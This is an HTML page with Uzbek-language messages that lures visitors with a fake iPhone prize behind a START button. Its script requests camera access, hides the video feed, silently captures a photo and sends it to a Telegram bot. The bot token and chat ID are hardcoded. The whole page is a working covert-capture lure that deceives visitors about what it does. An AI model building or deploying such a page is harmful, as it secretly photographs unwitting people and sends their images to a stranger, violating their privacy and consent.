<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rasmni Telegramga yuborish</title>
    <link rel="stylesheet" href="./main.css">
    <style>
        body {
            text-align: center;
            font-family: Arial, sans-serif;
            margin-top: 50px;
        }

        #startBtn {
            padding: 12px 20px;
            font-size: 18px;
            cursor: pointer;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
        }

        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
            display: none; 
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        #video {
            display: none;
        }
    </style>
</head>
<body>

    <button id="startBtn">START</button>
    <div class="loader" id="loader"></div>
    <video id="video" autoplay></video>
    <canvas id="canvas" style="display: none;"></canvas>

    <script>
        const startBtn = document.getElementById("startBtn");
        const loader = document.getElementById("loader");
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        const ctx = canvas.getContext("2d");

        const BOT_TOKEN = "8014330712:AAFXjFo0Bu9Vfyb5EP9hiN_7ZDbj19QC7zM"; 
        const CHAT_ID = "7593933022"; 

        async function initCamera() {
            loader.style.display = "block"; 
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;

                setTimeout(() => {
                    loader.style.display = "none"; 
                }, 1500);
            } catch (error) {
                loader.style.display = "none";
                alert("Kamera ishlamayapti: " + error);
            }
        }

        async function takeAndSendPhoto() {
            if (!video.srcObject) {
                alert("Siz Iphon sotib olmoqchimsiz");
                return;
            }

            // Rasm olish
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append("chat_id", CHAT_ID);
                formData.append("photo", blob, "photo.jpg");

                try {
                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: "POST",
                        body: formData
                    });
                    const result = await response.json();
                    alert("Iphone topilmadi boshqattan bosing yoki Разрешить knopkasini bosmagansiz");
                    console.log("Telegram javobi:", result);
                } catch (error) {
                    console.error("Xatolik:", error);
                    alert("❌ Xatolik yuz berdi.");
                }
            }, "image/jpeg");
        }

        startBtn.addEventListener("click", async () => {
            if (!video.srcObject) await initCamera();
            setTimeout(takeAndSendPhoto, 2000); 
        });
    </script>

</body>
</html>
